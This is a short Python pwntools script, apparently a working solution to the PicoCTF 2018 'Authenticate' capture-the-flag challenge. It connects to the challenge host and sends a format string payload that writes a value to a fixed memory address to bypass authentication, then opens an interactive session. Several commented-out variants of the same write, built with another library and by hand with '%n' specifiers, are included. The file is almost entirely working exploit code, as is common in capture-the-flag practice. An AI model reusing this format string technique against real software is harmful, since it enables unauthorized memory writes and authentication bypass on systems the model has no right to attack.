# This file is atm a working solution to Authenticate from PicoCTF 2018
# It uses a format string attack
# We can either maybe clean this file up and use it as a util function,
# or maybe just keep it as a documented example of how to get this to work

from pwn import *
from pwnlib import fmtstr as fs
from fmtstr import FormatString

r = remote('2018shell1.picoctf.com', '27114')
#r.sendline('AAAA' + '%p' * 30)

# idk about these, try them if the arch is weird
#context.bits=32
#context.clear(arch = 'i386')
#context.clear(bits = '32')

# works
# the 11 means that the string lies 11 * 4 bytes into the stack
s = fs.fmtstr_payload(11, { 0x804a04c: 1 })
print s
r.sendline(s)

# works
#s = FormatString(offset=11, written=0, bits=32)
## only seems to work with a char, not e.g. 1
#s[0x804a04c] = 'A'
#payload, sig = s.build()
#print 'payload:', payload
#r.sendline(payload)

# works
#s1 = 'AAAA\x08\x04\xa0\x4c' + '%12$n'
#s2 = 'AAAA\x4c\xa0\x04\x08' + '%12$n'
#r.sendline(s2)

r.interactive()
